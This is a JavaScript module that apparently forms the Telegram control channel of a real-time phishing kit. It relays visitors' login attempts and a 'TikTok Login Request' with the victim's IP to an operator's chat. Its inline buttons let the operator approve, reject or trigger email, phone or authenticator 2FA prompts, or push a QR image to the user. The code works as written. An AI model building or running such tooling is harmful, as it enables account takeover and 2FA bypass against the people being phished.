'use strict';

const { TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_CHAT_ID } = require('../config');

const MAX_MSG = 4000;

function tgApi(method, body) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    }).then(r =>
        r.json().then(data => {
            if (!data.ok) console.error('Telegram API error:', method, data);
            return data;
        })
    );
}

function sendApprovalMessage(requestId, text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Telegram not configured; skipping sendMessage');
        return Promise.resolve(null);
    }

    const body = text.length > MAX_MSG
        ? text.slice(0, MAX_MSG - 20) + '\n…(truncated)'
        : text;

    return tgApi('sendMessage', {
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: body + '\n\nAction?',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: 'approve:' + requestId },
                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
                ],
                [
                    { text: '🔐 2FA Email', callback_data: '2fa_email:' + requestId },
                    { text: '📱 2FA Phone', callback_data: '2fa_phone:' + requestId },
                    { text: '🔑 2FA App', callback_data: '2fa_totp:' + requestId }
                ]
            ]
        }
    });
}

function sendTiktokMessage(requestId, ip) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
        console.warn('Telegram not configured; skipping sendTiktokMessage');
        return Promise.resolve(null);
    }

    const text = `🎵 TikTok Login Request\n\nIP: ${ip}\n\nReply to this message with:\nimage_url:<URL>\n\nto show a QR/image to the user.`;

    return tgApi('sendMessage', {
        chat_id: TELEGRAM_ADMIN_CHAT_ID,
        text: text + '\n\nAction?',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ Reject', callback_data: 'reject:' + requestId }
                ]
            ]
        }
    });
}

function parseCallback(data) {
    if (!data || typeof data !== 'string') return null;
    const i = data.indexOf(':');
    if (i <= 0) return null;
    const action = data.slice(0, i);
    const requestId = data.slice(i + 1);
    if (!requestId) return null;
    const validActions = ['approve', 'reject', '2fa_email', '2fa_phone', '2fa_totp'];
    if (!validActions.includes(action)) return null;
    return { action, requestId };
}

module.exports = { tgApi, sendApprovalMessage, sendTiktokMessage, parseCallback };
